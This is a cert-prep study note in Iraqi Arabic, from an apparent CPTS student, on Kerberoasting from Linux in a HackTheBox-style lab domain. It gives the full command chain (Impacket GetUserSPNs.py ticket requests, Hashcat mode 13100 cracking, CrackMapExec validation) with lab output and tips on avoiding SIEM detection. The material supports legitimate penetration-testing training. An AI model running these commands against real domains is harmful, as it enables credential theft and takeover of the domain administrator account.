---
title: "SEC [NUM]: [REPLACE — Section Full Name]"
module: "[REPLACE — Module Name]"
section_num: [REPLACE — NUM]
target: "[REPLACE — TARGET_DOMAIN.LOCAL]"
tags:
  - CPTS
  - [REPLACE-Module-Tag]
  - [REPLACE-Topic-Tag]
difficulty: "[REPLACE — Easy | Medium | Hard]"
vectors: "[REPLACE — SMB | LDAP | WMI | RPC]"
tools: "[REPLACE — Tool1 · Tool2 · Tool3]"
status: "🟢 Complete"
date: "[REPLACE — YYYY-MM-DD]"
---

> [!abstract] ⚙️ HEXSEIN CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
> **📍 TARGET NODE:** `[REPLACE: TARGET.DOMAIN.LOCAL]`
> **🔐 ACCESS LEVEL:** `[REPLACE: Authenticated User]`
> **📡 ATTACK VECTOR:** `[REPLACE: SMB / LDAP]`
> 
> **📋 SECTION ID:** `SEC-[REPLACE: NUM]`
> **⚡ DIFFICULTY:** 🟡 `[REPLACE: Medium]`
> **🏁 STATUS:** 🟢 ONLINE — COMPLETE
> 
> **🛠️ KEY TOOLS:** `[REPLACE: Tool1 · Tool2]`
> **🎯 CORE OBJECTIVE:** `[REPLACE: 5-word objective]`
> **📅 DATE:** `[REPLACE: DATE]`

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     ██╗  ██╗███████╗██╗  ██╗███████╗███████╗██╗███╗   ██╗          ║
║     ██║  ██║██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║████╗  ██║          ║
║     ███████║█████╗   ╚███╔╝ ███████╗█████╗  ██║██╔██╗ ██║          ║
║     ██╔══██║██╔══╝   ██╔██╗ ╚════██║██╔══╝  ██║██║╚██╗██║          ║
║     ██║  ██║███████╗██╔╝ ██╗███████║███████╗██║██║ ╚████║          ║
║     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — CYBERPUNK NOTES v2.0              ║
║  [SECTION]  :: SEC-[NUM] // [REPLACE: SECTION_TITLE]                ║
║  [DOMAIN]   :: [REPLACE: TARGET_DOMAIN.LOCAL]                       ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate     ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway               ║
╚══════════════════════════════════════════════════════════════════════╝
```

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!tip] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD
> **Language:** Arabic — **Size:** ~2,000 Words
> **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

[تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ...

━━━━━

## 🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

تخيل وياي هذا المشهد بحياتنا اليومية: أنت تشتغل بشركة ضخمة، وكل موظف عنده "باج" إلكتروني (هوية) يفتح بيه أبواب الأقسام اللي مسموحله يدخلها. بالشركة اكو غرفة مهمة جداً اسمها "غرفة السيرفرات الرئيسية"، وعليها حارس. حتى تدخل لهي الغرفة، النظام بالشركة يكول: "روح لمكتب الاستعلامات المركزي (Domain Controller)، انطيهم باجك، وكللهم أريد ورقة مرور (Ticket) لغرفة السيرفرات".

الاستعلامات راح يتأكدون إنك موظف حقيقي، وينطوك ورقة مرور. بس هاي الورقة **مقفلة بقفل خاص** ما ينفتح إلا بمفتاح (باسورد) الموظف المسؤول عن غرفة السيرفرات. المفروض أنت تاخذ هاي الورقة المقفلة، تنطيها لموظف السيرفرات، وهو يفتحها ويسمحلك بالدخول.

**هنا يكمن الخلل الجوهري والتصميم الكارثي (The Root Flaw):**

شنو اللي يمنعك أنت كموظف عادي إنك تاخذ هاي الورقة المقفلة، وتحطها بجيبك، وتطلع من الشركة وتروح لبيتك؟ بالبيت، تكدر تجيب دريل، ومناشير، ومعدات كسر (Brute-force/Dictionary Attack) وتحاول تكسر القفل براحتك، بدون ما الاستعلامات يدرون بيك، وبدون ما كاميرات الشركة تصورك! إذا كان باسورد موظف السيرفرات ضعيف (مثل Password123)، راح تكسر القفل، وتعرف باسورده، وثاني يوم تجي للشركة وتدخل بصلاحياته كمدير!

هذا هو هجوم **Kerberoasting** بالضبط. في بيئة Windows Active Directory، الخدمات (مثل قواعد البيانات SQL، أو خوادم الويب) تحتاج حسابات حتى تشتغل. ولأن الحسابات المحلية (Local System) ما تكدر تتواصل عبر الشبكة بسهولة، مدراء النظام (IT Admins) يسوون حسابات مستخدمين عادية (Domain Users) ويخلونها تشغل هاي الخدمات. ويربطون هاي الحسابات بشيء اسمه "اسم مدير الخدمة" (SPN).

بروتوكول Kerberos مصمم بطريقة تجبره يعطيك "تذكرة خدمة" (TGS) مشفرة بباسورد حساب الخدمة، بمجرد أن تطلبها (حتى لو كنت أضعف مستخدم بالشبكة). المهاجم ياخذ هاي التذكرة لبيئته الخاصة (Linux/Kali/Parrot) ويكسرها أوفلاين (Offline Cracking).

**ليش هذا السكشن مخصص للـ Linux؟**

السكشن السابق علمنا شلون نسوي هذا الهجوم من داخل بيئة Windows نفسها. بس بالواقع، أنت كـ Pentester، أحياناً ما عندك حاسبة ويندوز مخترقة. أحياناً أنت كاعد ورا حاسبتك اللينكس (Kali أو Parrot)، وما متصل بالدومين كجهاز (Non-domain joined)، بس حصلت "يوزر وباسورد" عاديين من هجوم Phishing أو من ملف مسرب. هذا السكشن يعلمك شلون تستخدم أدوات مبنية بلغة Python (مثل حزمة Impacket) حتى تحاكي لغة الويندوز وتطلب التذاكر وتسرقها وأنت مرتاح ببيئة اللينكس مالتك.

**وين هذا السكشن يقع بخريطة CPTS؟**

هذا السكشن هو درة تاج مرحلة ما بعد الاختراق (Post-Exploitation) وتصعيد الصلاحيات (Privilege Escalation) والتحرك الجانبي (Lateral Movement). هو الخطوة اللي تنقلك من "مستخدم عادي ماله قيمة" إلى "مدير شبكة (Domain Admin)" في حال كان حساب الخدمة يمتلك صلاحيات عالية.

**شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟**

1. راح تكدر تتصل بالـ Active Directory من نظام Linux غير مرتبط بالدومين.
    
2. راح تتعلم شلون تستخرج كل حسابات الـ SPNs وتحدد منو بيها يملك صلاحيات عالية (Domain Admins).
    
3. راح تستخدم أداة `GetUserSPNs.py` لسحب التذاكر وحفظها بصيغة جاهزة للكسر.
    
4. راح تكسر التذاكر باستخدام Hashcat، وتتأكد من صلاحياتك الجديدة بالشبكة.
    

━━━━━

## 🔵 المرحلة 1: خريطة المفاهيم

حتى لا تصير الأوامر مجرد طلاسم، لازم نفكك المصطلحات التقنية اللي وردت بالنص ونفهمها بالعراقي البسيط:

**1. Service Principal Name (SPN)**

- **شنو يعني بالعراقي البسيط؟** هو "الرقم الوظيفي" أو "اليافطة" اللي تتعلق على باب الخدمة. الويندوز شبكة ضخمة، حتى الكمبيوتر يندل وين يروح لمن يريد خدمة معينة، لازم الخدمة تسجل نفسها بالشبكة وتكول: "أني خدمة قاعدة البيانات (MSSQL)، وموجودة على السيرفر الفلاني، والحساب اللي يشغلني اسمه كذا".
    
- **وين يظهر؟** يظهر بالـ Output مال أداة Impacket هيج: `MSSQLSvc/SPSJDB.inlanefreight.local:1433`.
    
- **ليش يهمنا؟** لأن Kerberoasting ما يشتغل إلا على الحسابات اللي عندها SPN.
    

**2. Service Account (حساب الخدمة)**

- **شنو يعني بالعراقي البسيط؟** هو يوزر عادي بالـ Active Directory، بس الموظف الـ IT ما سواه لشخص بشري (مثل أحمد أو علي)، سواه حتى يخلي برنامج (مثل SQL Server أو Exchange) يشتغل ويسجل دخول بيه.
    
- **المشكلة الكارثية:** لأن هذا مو بشر، مدراء النظام يتعاجزون يغيرون باسورده كل فترة (حتى لا توكف الخدمة)، وغالباً يخلوه باسورد سهل، والأدهى من هذا، ينطونه صلاحيات "مدير شبكة" (Domain Admin) حتى البرنامج يشتغل بدون مشاكل. وهذا هو الصيد الثمين مالتنا.
    

**3. TGS-REP (Ticket Granting Service Reply)**

- **شنو يعني بالعراقي البسيط؟** هي "تذكرة الدخول" اللي تكلمنا عليها بالقصة. من تطلب من الـ DC إنك تريد تتصل بخدمة، الـ DC يرد عليك برسالة اسمها TGS-REP. هاي الرسالة تحتوي على التذكرة اللي مشفرة بباسورد حساب الخدمة (NTLM Hash). هاي التذكرة هي اللي راح نسرقها ونكسرها.
    

**4. Offline Cracking (الكسر خارج الاتصال)**

- **شنو يعني بالعراقي البسيط؟** تخيل أنت تجرب مفاتيح على قفل باب حقيقي بالشارع. إذا جربت 5 مفاتيح غلط، الحارس راح يصيدك (هذا Online Brute-force، والويندوز يقفل الحساب بعد 5 محاولات). الـ Offline Cracking هو إنك تاخذ القفل للبيت، وتجرب عليه مليون مفتاح بالثانية بدون ما أحد يحس بيك، وبدون ما الحساب ينقفل بالشركة. هنا نستخدم برنامج Hashcat على كروت شاشة قوية.
    

**5. Impacket Toolkit**

- **شنو يعني بالعراقي البسيط؟** الويندوز يحجي لغة خاصة بيه (RPC, SMB, Kerberos). اللينكس (مثل كالي) ما يفتهم هاي اللغة بشكل افتراضي. حزمة `Impacket` هي عبارة عن سكربتات مكتوبة بلغة Python تعمل كـ "مترجم". تخلي جهازك اللينكس يحجي ويا الويندوز وكأنه جهاز ويندوز أصلي. أداة `GetUserSPNs.py` هي وحدة من هاي السكربتات.
    

**6. Cleartext Password vs. NTLM Hash**

- **شنو يعني بالعراقي البسيط؟** الـ Cleartext هو الباسورد العادي اللي تكتبه بيدك (مثل `database!`). الـ NTLM Hash هو النسخة المشفرة مالته اللي تنحفظ بالويندوز (مثل `81f3efb5827a05f6ca1...`). الأداة اللي راح نستخدمها تقبل تنطيها باسورد عادي، أو تنطيها Hash حتى تثبت هويتك للـ DC وتبدأ الهجوم.
    

━━━━━

## 🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

**موضوع السكشن:** هجوم Kerberoasting من بيئة اللينكس (Kerberoasting - from Linux). السكشن يشرحلك شلون تنفذ هذا الهجوم الشهير إذا كانت حاسبتك الهجومية تعمل بنظام Linux، باستخدام حزمة أدوات مفتوحة المصدر.

🎯 **ماذا يريد هذا السكشن أن تتعلم؟**

1. فهم لماذا حسابات الخدمات (Service Accounts) تمثل نقطة ضعف استراتيجية في الشبكات (غالباً يملكون صلاحيات عالية وباسوردات ضعيفة).
    
2. تثبيت وتجهيز حزمة Impacket على نظام Linux.
    
3. استخراج قائمة بكل الحسابات المرتبطة بـ SPN ومعرفة صلاحياتها ومجموعاتها (Group Membership).
    
4. طلب تذاكر TGS للحسابات المستهدفة وحفظها بصيغة جاهزة للكسر.
    
5. استخدام Hashcat لكسر التذكرة واستخراج كلمة المرور، ثم التحقق من الصلاحيات باستخدام CrackMapExec.
    

📐 **هيكل المحتوى (Section Blueprint):**

السكشن مصمم كرحلة اختراق واقعية (End-to-End)، يبدأ من النظرية وينتهي بالسيطرة الكاملة:

```
[1. النظرة العامة (Theory & Overview)]
       │   شرح المفهوم، وكيف ولماذا تمتلك حسابات الخدمات صلاحيات عالية (Domain Admins).
       ▼
[2. فعالية الهجوم (Efficacy of the Attack)]
       │   توضيح متى يكون الهجوم High Risk (حصلت باسورد قوي أو Domain Admin) ومتى يكون Medium Risk.
       ▼
[3. التحضير والتثبيت (Setup & Installation)]
       │   تثبيت حزمة Impacket عبر Python Pip.
       ▼
[4. الاستطلاع (Enumeration)]
       │   تشغيل GetUserSPNs.py لمعرفة الحسابات المتاحة وصلاحياتها.
       ▼
[5. التنفيذ والاستخراج (Execution & Extraction)]
       │   استخدام الـ flags (-request و -outputfile) لسحب التذاكر.
       ▼
[6. الكسر والتحقق (Cracking & Validation)]
       │   كسر التذكرة بـ Hashcat، وتجربة الباسورد الجديد بـ CrackMapExec للوصول للسيرفر.
```

🔗 **المتطلبات السابقة:**

حتى تفهم وتطبق هذا السكشن، السكشن يفترض إنك:

1. تمتلك اسم مستخدم وكلمة مرور (أو هاش) لحساب عادي (Standard User) داخل الدومين. (بدون يوزر عادي، ما تكدر تطلب أي تذكرة).
    
2. تعرف عنوان الـ IP الخاص بالـ Domain Controller.
    
3. تعرف أساسيات التعامل مع Terminal في Linux وتثبيت أدوات Python.
    

⚠️ **ما يذكره السكشن ضمنياً (الافتراضات المخفية):**

1. **دقة الوقت (Time Synchronization):** بروتوكول Kerberos حساس جداً للوقت. إذا كان وقت حاسبتك اللينكس يختلف عن وقت الـ Domain Controller بأكثر من 5 دقائق، أداة `GetUserSPNs.py` راح تفشل وتنطيك أخطاء (Kerberos SessionError). السكشن افترض إنك مساوي الوقت مسبقاً.
    
2. **تحليل الـ Risk:** السكشن يذكر إنك كمختبر اختراق (Pentester) لازم تعرف شلون تصيغ التقرير. إذا ما كدرت تكسر التذكرة، لا تكتب بالتقرير إن الشبكة مخترقة، بل اكتب "مخاطرة متوسطة" (Medium Risk) لوجود SPNs، وهذا يعلمك الأمانة المهنية بالتقارير.
    

━━━━━

## 🟠 المرحلة 3: الشرح العميق

وصلنا للجزء الأهم، الشرح العملي التفصيلي لكل أمر ذكره السكشن. راح نفككه قطعة قطعة ونشرحه مثل ما يشرح المهندس لصديقه.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 1: تثبيت حزمة Impacket (The Setup)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

تخيل حزمة Impacket هي "صندوق العدة" السحري الخاص بيك. هاي الحزمة عبارة عن كودات مكتوبة بلغة بايثون، تخلي اللينكس مالتك يحجي لغة الويندوز. السكشن يبدأ بتعليمنا شلون ننزل هاي الحزمة ونثبتها بالنظام حتى نكدر نشغل سكربتاتها من أي مكان.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

اللينكس ما يحتوي على مكتبات داخلية للتعامل مع بروتوكولات Microsoft المعقدة مثل SMB أو Kerberos أو RPC. فريق اسمه SecureAuth (سابقاً Core Security) كتبوا هاي المكتبات من الصفر بالبايثون. حتى نثبتها صح ونخلي النظام يتعرف عليها، نستخدم أداة إدارة الحزم مال بايثون اللي هي `pip`.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ sudo python3 -m pip install .
```

💬 **شرح الـ flags:**

- `sudo`: نحتاج صلاحيات الجذر (root) حتى نثبت الأداة على مستوى النظام كله.
    
- `python3 -m pip`: نستدعي أداة تثبيت الحزم (pip) الخاصة بالإصدار الثالث من بايثون.
    
- `install .`: النقطة (`.`) هنا مو عبث! معناها: "ثبت الحزمة الموجودة في الفولدر الحالي اللي أني كاعد بيه هسة". (طبعاً لازم تكون مسوي `git clone` وداخل لمجلد impacket قبل هذا الأمر).
    

📤 **الـ Output المتوقع:**

الـ Output راح يراويك إنه دا يحمل ملفات الاعتماديات (Dependencies) مثل `ldap3` و `flask` ويثبتها بالنظام:

Code snippet

```
Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet ...
```

⏸️ **نقطة توقف:** هسة حاسبتنا اللينكس صارت جاهزة وتتكلم "لغة ويندوز" بطلاقة. حان وقت استكشاف الشبكة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 2: استكشاف الحسابات (Listing SPNs)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

قبل لا نسرق التذاكر، لازم نعرف "منو" الموجود بالشبكة. راح نستخدم أداة `GetUserSPNs.py` ونتصل بموظف الاستعلامات (الـ Domain Controller) ونكله: "بلا زحمة، انطينا قائمة بكل الخدمات الموجودة بالشركة، ومنو الموظفين (اليوزرات) اللي يشغلوها، وشنو مناصبهم (Group Membership)".

🎭 **التشبيه:**

كأنما تطلب "الهيكل التنظيمي" للشركة، وتدور بيه على الموظفين اللي عندهم صلاحيات يوقعون شيكات مالية (Domain Admins)، حتى تركز هدفك عليهم وماتضيع وقتك ويا موظفين صغار.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

السكربت يتصل بقاعدة بيانات الـ Active Directory (باستخدام بروتوكول LDAP)، ويسوي بحث (Query) عن كل الحسابات اللي عندها Attribute اسمه `servicePrincipalName` مو فارغ. وبنفس الوقت، يقرأ الـ Attributes مال هذا الحساب مثل `MemberOf` حتى يراويك صلاحياته.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

💬 **شرح الـ flags:**

- `GetUserSPNs.py`: اسم السكربت.
    
- `-dc-ip 172.16.5.5`: نحدد الـ IP مال الـ Domain Controller، لأنمرات الدومين نيم ما ينقري صح باللينكس (DNS issues).
    
- `INLANEFREIGHT.LOCAL/forend`: ننطيه اسم الدومين متبوعاً باسم اليوزر العادي اللي نملكه (forend). السكربت راح يطلب منك الباسورد المخفي.
    

📤 **الـ Output المتوقع:**

هذا الـ Output هو كنز حقيقي، ركز بيه:

Code snippet

```
ServicePrincipalName                           Name               MemberOf                                             PasswordLastSet
---------------------------------------------  -----------------  ---------------------------------------------------  --------------------------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:40.842452
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL   2022-02-15 17:09:46.326865
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334
```

🔍 **كيف تقرأ الـ Output؟:**

- **عمود ServicePrincipalName:** هذا اسم الخدمة. مثلاً `MSSQLSvc` يعني قاعدة بيانات SQL.
    
- **عمود Name:** اسم اليوزر اللي يشغل الخدمة (مثلاً `sqldev`).
    
- **عمود MemberOf (الأهم!):** هذا يكولك اليوزر لأي مجموعة ينتمي. باوع على يوزر `sqldev`، هو عضو بـ `CN=Domain Admins`! يعني هذا اليوزر هو إله بالشبكة (مدير عام). إذا كسرنا باسورده، فزنا باللعبة كلها!
    
- **عمود PasswordLastSet:** يكولك شوكت آخر مرة غير باسورده. (لو كان متغير من 10 سنين، معناها الباسورد زبالة وراح ينكسر بثواني).
    

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- _ليش ما نطلب التذاكر مباشرة بدل ما نستكشف؟_
    
    لأن إذا الشبكة بيها 500 خدمة، وطلبت 500 تذكرة بثانية وحدة، أنظمة المراقبة (SIEM/SOC) راح تصفر وتصيدك فوراً. الاستكشاف يخليك تختار هدفك بذكاء (تستهدف الـ Domain Admins فقط).
    

⏸️ **نقطة توقف:** هسة عرفنا منو أهدافنا. الهدف الأثمن هو يوزر `sqldev` لأنه `Domain Admin`. الخطوة الجاية: نسرق تذكرته.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 3: طلب وسحب التذاكر (-request و -outputfile)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

هسة راح نكول للسكربت: "عاشت إيدك، عرفنا الأهداف. هسة روح اطلبلي تذكرة الدخول (TGS) ليوزر sqldev تحديداً، واكتبلي الهاش مال التذكرة بملف نظيف حتى أخذه لبرنامج الكسر".

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

السكربت راح يبني رسالة `TGS-REQ` (طلب تذكرة خدمة) ويرسلها للـ KDC (اللي هو الـ Domain Controller). الـ KDC ما راح يتحقق إذا كنا إحنا فعلاً نريد نستخدم الخدمة أم لا، راح يرد علينا مباشرة برسالة `TGS-REP` تحتوي على التذكرة المشفرة بباسورد الـ `sqldev`. السكربت راح يستلمها، يفككها، ويستخرج منها الجزء اللي نحتاجه ونكدر نكسره.

Plaintext

```
رسم توضيحي للعملية (ASCII Diagram):

[حاسبتك اللينكس]                              [Domain Controller (KDC)]
       │                                                 │
       ├── TGS-REQ (أريد تذكرة لخدمة MSSQLSvc/sqldev) ──►│
       │                                                 │
       │◄── TGS-REP (تفضل التذكرة مشفرة بباسورد sqldev)──┤
       │                                                 │
[يتم حفظ التذكرة بملف للكسر الأوفلاين]
```

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

💬 **شرح الـ flags:**

- `-request-user sqldev`: هذا الـ flag الذكي يخليك تستهدف يوزر واحد فقط (sqldev). (السكشن ذكر أمر `-request` لوحده، وهذا يسحب كل التذاكر بالشبكة، بس هذا مكشوف وصوته عالي. الأفضل نكون دقيقين).
    
- `-outputfile sqldev_tgs`: هذا الـ flag يحل مشكلة كبيرة. بدل ما التذكرة (الهاش) تنطبع على الشاشة وتصير هوسة وتضطر تنسخها بيدك وتغلط بالفراغات، السكربت راح يحفظها بشكل نظيف داخل ملف اسمه `sqldev_tgs`.
    

📤 **الـ Output المتوقع:**

السكربت راح يطبع الجدول مرة ثانية، بس بالخلفية راح يصنع ملف `sqldev_tgs`، إذا قرينا الملف راح نلكى بي هاش طويل يبدي بهيج شكل:

Plaintext

```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca1...
```

_(هذا الهاش هو التذكرة المشفرة، ورقم `23` يعني التشفير هو RC4، وهو تشفير ضعيف جداً وحلو لبرامج الكسر)._

⏸️ **نقطة توقف:** السرقة تمت بنجاح وبدون ما يحس الـ KDC. التذكرة هسة بجيبنا (بملف `sqldev_tgs`). ننتقل لمرحلة كسر القفل.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 4: كسر التذكرة أوفلاين (Hashcat)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

أخذنا التذكرة المقفولة لبيتنا. هسة راح نشغل دريل ضخم (برنامج Hashcat) ونخلي وياه موسوعة ضخمة مال باسورادت (rockyou.txt)، ونكله: "جرب كل هاي الباسوردات بسرعة البرق لحد ما ينفتح القفل".

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

الـ Hashcat هو برنامج يستغل قوة المعالج (CPU) أو كارت الشاشة (GPU) حتى يطبق خوارزمية التشفير على كل كلمة بالقاموس ويقارن النتيجة ويا الهاش اللي سرقناه. إذا تطابقوا، معناها لكى الباسورد. نوع التشفير اللي يبدي بـ `$krb5tgs$23$` هو (RC4 HMAC-MD5)، وهو خوارزمية ضعيفة المعالج يكدر يجرب بيها ملايين الاحتمالات بالثانية.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

💬 **شرح الـ flags:**

- `-m 13100`: حرف الـ m يعني Mode (الوضع). رقم 13100 هو المعرف الخاص بخوارزمية (Kerberos 5, etype 23, TGS-REP) ببرنامج Hashcat. (لازم تحفظه).
    
- `sqldev_tgs`: اسم الملف اللي بيه الهاش المسروق.
    
- `/usr/share/wordlists/rockyou.txt`: مسار القاموس الشهير (rockyou) اللي بيه ملايين الباسوردات المسربة.
    

📤 **الـ Output المتوقع:**

بعد ثواني، راح تظهرلك الشاشة الخضراء الجميلة:

Code snippet

```
...c1f:database!
Session..........: hashcat
Status...........: Cracked
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Speed.#1.........:   821.3 kH/s (11.88ms) 
```

🔍 **كيف تقرأ الـ Output؟:**

- **`database!`**: هذا هو الباسورد الصافي (Cleartext)! لكيناه بنهاية الهاش بعد النقطتين الراسيتين `:`.
    
- **`Status: Cracked`**: يعني العملية نجحت وتم الكسر.
    
- **`Speed`**: سرعة الكسر، هنا 821 كيلو هاش بالثانية. (تخيل 821 ألف محاولة بالثانية!).
    
- **`Time.Started`**: الكسر أخذ 10 ثواني بس! (لأن الباسورد ضعيف والتشفير RC4).
    

⏸️ **نقطة توقف:** هسة إحنا صرنا نملك اسم اليوزر (`sqldev`) والباسورد (`database!`). تذكر إن هذا اليوزر هو Domain Admin؟ خلي نتأكد.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 5: التحقق من الصلاحيات (CrackMapExec)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

مو أي باسورد نكسره يعني صرنا أبطال. لازم نتأكد إن الباسورد يشتغل، ونتأكد شنو صلاحياتنا الحقيقية بالشبكة. راح نستخدم أداة مثل السكين السويسري اسمها `CrackMapExec` (أو حالياً معروفة بـ NetExec) حتى نرمي هذا الباسورد بوجه السيرفر ونشوف شيكولنا.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

الأداة تتصل بالسيرفر عبر بروتوكول SMB (اللي مسؤول عن مشاركة الملفات وإدارة النظام عن بعد) وتحاول تسجل دخول باليوزر والباسورد اللي حصلناهم. إذا نجحت، راح تفحص صلاحيات اليوزر الإدارية على هذا السيرفر وترجعلك النتيجة.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

💬 **شرح الـ flags:**

- `smb`: البروتوكول اللي راح نفحصه.
    
- `172.16.5.5`: آي بي الـ Domain Controller اللي نريد نسيطر عليه.
    
- `-u sqldev`: اسم اليوزر اللي كسرناه.
    
- `-p database!`: الباسورد اللي طلعناه من Hashcat.
    

📤 **الـ Output المتوقع:**

Code snippet

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

🔍 **كيف تقرأ الـ Output؟:**

- `[+]`: العلامة الخضراء تعني إن الباسورد صحيح 100% والـ Authentication نجح.
    
- `(Pwn3d!)`: هاي الكلمة الذهبية! بالـ CrackMapExec، كلمة `Pwn3d!` (تم الاختراق) تظهر فقط وفقط إذا كان هذا اليوزر يمتلك صلاحيات **Local Administrator** على الهدف. ولأن الهدف هو Domain Controller، فهذا يعني رسمياً إنك صرت **Domain Admin** وسيطرت على الشركة بالكامل!
    

📊 **ملخص ما تعلمنا:**

|**المفهوم / الأداة**|**ما يعني ويعمل**|**متى تستخدمه**|
|---|---|---|
|`pip install .`|تثبيت أدوات Impacket|مرة واحدة لتحضير بيئة اللينكس للاختراق.|
|`GetUserSPNs.py`|استخراج الحسابات ذات الـ SPNs وسحب تذاكرها|للاستطلاع (Enumeration) وسرقة التذاكر من اللينكس.|
|`-request-user`|سحب تذكرة لحساب واحد محدد|للاستنقاء الجراحي وتجنب إثارة الإنذارات.|
|`Hashcat -m 13100`|كسر هاش Kerberos RC4 (TGS-REP)|لتحويل التذكرة المشفرة إلى باسورد صافي.|
|`CrackMapExec`|فحص الصلاحيات الإدارية|للتأكد من نجاح الباسورد ومعرفة إن كنا Pwn3d!|

━━━━━

## 🔴 المرحلة 4: ما لا يقوله السكشن

هذه المرحلة هي اللي تفصل بين "طالب يطبق خطوات اللاب" و"مختبر اختراق محترف يواجه العالم الحقيقي". اكو هواي تفاصيل السكشن غض النظر عنها لتبسيط الأمور:

🕳️ **الثغرات في شرح السكشن:**

1. **مشكلة مزامنة الوقت (Time Skew Error):** السكشن ما ذكر إن بروتوكول Kerberos عنده قاعدة ذهبية: "لازم وقت المهاجم ووقت السيرفر يكون الفرق بينهم أقل من 5 دقائق". باللينكس مالتك (Kali/Parrot)، إذا الوقت ما مضبوط، `GetUserSPNs.py` راح يطبعلك خطأ أحمر طويل `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`. الحل؟ لازم تنصب أداة `ntpdate` وتزامن وقتك ويا الـ DC، أو تستخدم أمر `net rpc info` حتى تقرأ وقت السيرفر وتغير وقت حاسبتك يدوياً.
    
2. **مشكلة تحليل الـ DNS:** أدوات Impacket تعشق أسماء الدومين وتكره الـ IP في بعض استعلامات Kerberos (لأن الكيربروس يعتمد على الاسم). السكشن استخدم `-dc-ip` وهذا قلل المشكلة، بس أحياناً يطلب منك اسم الدومين الكامل. إذا اللينكس مالتك ما يكدر يترجم `INLANEFREIGHT.LOCAL` إلى آي بي، الأداة راح تفشل. لازم دائماً تضيف الـ IP واسم الدومين واسم السيرفر بملف `/etc/hosts` باللينكس مالتك قبل لا تبدأ أي هجوم AD.
    

⚠️ **الـ Gotchas عند تطبيق هذا بالـ Lab (فخوخ شائعة):**

1. **استخدام `-request` بدون تحديد:** باللاب ممكن تسويها وتنجح لأن اللاب صغير (3 يوزرات). ببيئة حقيقية (Enterprise)، إذا استخدمت `-request` بدون تخصيص، راح تسحب 2000 تذكرة، وهذا راح يخلي ملف الـ Output ضخم جداً ومليان حسابات كمبيوترات وأشياء مالها داعي، وراح يطول الكسر لأيام. دائماً استكشف أولاً، ثم اسحب تذاكر الـ `Domain Admins` أو اليوزرات المتميزة فقط باستخدام `-request-user`.
    
